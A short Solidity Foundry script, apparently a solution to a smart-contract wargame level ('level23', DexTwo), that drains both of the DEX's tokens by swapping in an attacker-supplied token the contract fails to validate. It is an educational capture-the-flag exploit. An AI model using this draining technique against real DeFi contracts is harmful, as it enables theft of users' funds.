// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/Ilevel23.sol";

contract POC is Script {
    DexTwo level23 = DexTwo(0x09BB45EEa835AcF9047033ec463feB98890624dF);

    function run() external {
        vm.startBroadcast();
        address ZTN = address(0xD232933B9e72AcaE72Ae56E8156fa3FB80b2fEbd);
        address token1 = level23.token1();
        address token2 = level23.token2();

        level23.swap(ZTN, token1, 100);
        level23.swap(ZTN, token2, 200);

        console.log(
            "Remaining token1 balance : ",
            level23.balanceOf(token1, address(level23))
        );
        console.log(
            "Remaining token2 balance : ",
            level23.balanceOf(token2, address(level23))
        );
        vm.stopBroadcast();
    }
}
